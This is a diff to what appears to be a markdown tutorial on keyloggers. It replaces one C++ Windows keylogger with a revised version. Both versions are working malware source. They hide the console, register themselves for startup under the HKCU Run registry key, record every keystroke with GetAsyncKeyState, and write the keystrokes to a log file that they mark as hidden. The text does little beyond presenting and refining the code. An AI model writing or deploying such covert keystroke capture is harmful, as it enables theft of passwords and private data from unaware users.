@@ -35,59 +35,131 @@ A keylogger is a type of malware used in cyberattacks to steal sensitive informa
    ```
     #include <iostream>
     #include <windows.h>
+    #include <ctime>      // For timestamp
+    #include <sstream>    // For constructing filename
+    #include <fstream>    // For file operations
+    #include <string>     // For string manipulation
     
     using namespace std;
     
-    int Save(int _key, char *file);
-    
     void AddToStartup() {
-        char filePath[MAX_PATH];
-        GetModuleFileName(NULL, filePath, MAX_PATH);
+        // Get the current executable path using the wide-character version of GetModuleFileName
+        wchar_t filePath[MAX_PATH];
+        GetModuleFileNameW(NULL, filePath, MAX_PATH);  // Get the path of the current executable
+    
         HKEY hKey;
-        RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
-        RegSetValueEx(hKey, "MyKeylogger", 0, REG_SZ, (BYTE*)filePath, strlen(filePath) + 1);
-        RegCloseKey(hKey);
-    }
+        // Create or open the registry key for startup (HKEY_CURRENT_USER means it will only affect the current user)
+        LONG createStatus = RegCreateKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
     
-    void HideLogFile() {
-        SetFileAttributes("log.txt", FILE_ATTRIBUTE_HIDDEN);
-    }
-    
-    int main() {
-        FreeConsole();
-        AddToStartup();
-        HideLogFile();
-    
-        char i;
-        while (true) {
-            Sleep(10);
-            for (i = 8; i <= 255; i++) {
-                if (GetAsyncKeyState(i) == -32767) {
-                    Save(i, (char*)"log.txt");
-                }
+        if (createStatus == ERROR_SUCCESS) {
+            // Set the registry value to add the executable to the startup list
+            LONG status = RegSetValueExW(hKey, L"MyKeylogger", 0, REG_SZ, (BYTE*)filePath, (wcslen(filePath) + 1) * sizeof(wchar_t));
+            
+            if (status == ERROR_SUCCESS) {
+                cout << "Keylogger successfully added to startup!" << endl;
+            } else {
+                cerr << "Error setting registry value!" << endl;
             }
+    
+            // Close the registry key handle
+            RegCloseKey(hKey);
+        } else {
+            cerr << "Error creating/opening registry key!" << endl;
         }
+    }
+    
+    string CreateDynamicLogFile() {
+        // Generate a dynamic file name based on timestamp
+        time_t now = time(NULL);
+        struct tm* localTime = localtime(&now);
+    
+        stringstream filename;
+        filename << "log_"
+                 << localTime->tm_year + 1900 << "_"
+                 << (localTime->tm_mon + 1) << "_"
+                 << localTime->tm_mday << "_"
+                 << localTime->tm_hour << "_"
+                 << localTime->tm_min << "_"
+                 << localTime->tm_sec << ".txt"; // Second
+    
+        return filename.str();
+    }
+    
+    void HideLogFile(const string& filename) {
+        DWORD attributes = GetFileAttributes(filename.c_str());
+        if (attributes == INVALID_FILE_ATTRIBUTES) {
+            cerr << "Error getting file attributes for " << filename << endl;
+            return;
+        }
+    
+        // Set file attributes to hidden
+        if (SetFileAttributes(filename.c_str(), attributes | FILE_ATTRIBUTE_HIDDEN)) {
+            cout << "Successfully set file to hidden: " << filename << endl;
+        } else {
+            cerr << "Failed to set file to hidden: " << filename << endl;
+        }
+    }
+    
+    int Save(int _key, const char* file) {
+        ofstream OUTPUT_FILE(file, ios::app);
+        if (!OUTPUT_FILE.is_open()) {
+            cerr << "Error opening file!" << endl;
+            return -1;
+        }
+    
+        // Save key inputs to file
+        switch (_key) {
+            case VK_SHIFT: OUTPUT_FILE << "[SHIFT]"; break;
+            case VK_BACK: OUTPUT_FILE << "[BACKSPACE]"; break;
+            case VK_LBUTTON: OUTPUT_FILE << "[L_CLICK]"; break;
+            case VK_RBUTTON: OUTPUT_FILE << "[R_CLICK]"; break;
+            case VK_RETURN: OUTPUT_FILE << "[ENTER]"; break;
+            case VK_TAB: OUTPUT_FILE << "[TAB]"; break;
+            case VK_ESCAPE: OUTPUT_FILE << "[ESCAPE]"; break;
+            case VK_CONTROL: OUTPUT_FILE << "[CTRL]"; break;
+            case VK_MENU: OUTPUT_FILE << "[ALT]"; break;
+            case VK_CAPITAL: OUTPUT_FILE << "[CAPS LOCK]"; break;
+            case VK_SPACE: OUTPUT_FILE << "[SPACE]"; break;
+            default: OUTPUT_FILE << (char)_key;
+        }
+    
+        OUTPUT_FILE.close();
+        HideLogFile(file);
+    
         return 0;
     }
     
-    int Save(int _key, char *file) {
-        FILE *OUTPUT_FILE;
-        OUTPUT_FILE = fopen(file, "a+");
-        switch (_key) {
-            case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]"); break;
-            case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]"); break;
-            case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LBUTTON]"); break;
-            case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]"); break;
-            case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]"); break;
-            case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]"); break;
-            case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]"); break;
-            case VK_CONTROL: fprintf(OUTPUT_FILE, "[CTRL]"); break;
-            case VK_MENU: fprintf(OUTPUT_FILE, "[ALT]"); break;
-            case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS LOCK]"); break;
-            case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]"); break;
+    int main() {
+        // Hide the console window
+        FreeConsole();
+    
+        // Copy the executable to the Startup folder (ensures persistence)
+        AddToStartup(); // Using the updated AddToStartup function
+    
+        // Create and hide the log file
+        string logFilename = CreateDynamicLogFile();
+        cout << "Log file created: " << logFilename << endl;
+    
+        ofstream logFile(logFilename.c_str());
+        if (logFile.is_open()) {
+            logFile.close();
+        } else {
+            cerr << "Error creating log file!" << endl;
+            return -1;
         }
-        fprintf(OUTPUT_FILE, "%s", &_key);
-        fclose(OUTPUT_FILE);
+    
+        HideLogFile(logFilename);
+    
+        char i;
+        while (true) {
+            Sleep(10); // Reduce CPU usage
+            for (i = 8; i <= 255; i++) {
+                if (GetAsyncKeyState(i) == -32767) {
+                    Save(i, logFilename.c_str()); // Save key presses to the log file
+                }
+            }
+        }
+    
         return 0;
     }
    ```
